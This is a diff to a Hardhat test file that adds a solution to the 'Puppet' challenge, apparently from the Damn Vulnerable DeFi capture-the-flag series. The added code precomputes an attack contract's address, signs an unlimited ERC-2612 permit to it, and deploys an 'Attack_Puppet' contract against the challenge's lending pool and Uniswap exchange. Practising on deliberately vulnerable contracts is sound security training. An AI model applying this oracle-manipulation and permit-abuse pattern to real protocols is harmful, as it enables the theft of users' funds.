@@ -4,6 +4,8 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require('eth-permit');
+
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,10 +97,14 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        await uniswapExchange.connect(player).tokenToEthSwapInput(1000, 0, 1775029706);
 
-        await lendingPool.connect(player).borrow(1000, player.address, {value: await lendingPool.calculateDepositRequired(1000)});
+        //Calculate where the contract will be deployed
+        const attackContractAddress = ethers.utils.getContractAddress({from: player.address,nonce: 0});
 
+        //generate the permit signature
+        const { v, r, s } = await signERC2612Permit(player, token.address, player.address, attackContractAddress, ethers.constants.MaxUint256);
+
+        await ethers.getContractFactory('Attack_Puppet', player).then(c => c.deploy(lendingPool.address, uniswapExchange.address, token.address, v, r, s, {value:  ethers.utils.parseEther('10')}));
     });
 
     after(async function () {
